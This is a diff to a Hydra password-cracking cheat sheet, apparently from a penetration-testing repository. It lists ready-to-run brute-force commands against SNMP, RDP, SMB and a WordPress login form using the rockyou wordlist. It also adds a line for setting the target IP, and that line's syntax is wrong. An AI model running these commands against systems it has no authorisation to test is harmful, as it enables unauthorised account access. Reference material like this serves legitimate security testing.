@@ -1,6 +1,11 @@
 # Hydra-Cheatsheet
 Hydra Password Cracking Cheetsheet
 
+The following table uses the $ip variable which can be set with the following command:  
+
+`export ip 10.10.10.1`
+
+
 | Command | Description |
 |-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
 | hydra -P password-file.txt -v $ip snmp                                                                                                    | Hydra brute force against SNMP                       |
@@ -14,4 +19,5 @@ Hydra Password Cracking Cheetsheet
 | hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                           | Hydra attack Windows Remote Desktop with rockyou     |
 | hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                             | Hydra brute force SMB user with rockyou:             |
 | hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
-| 
+  
+  
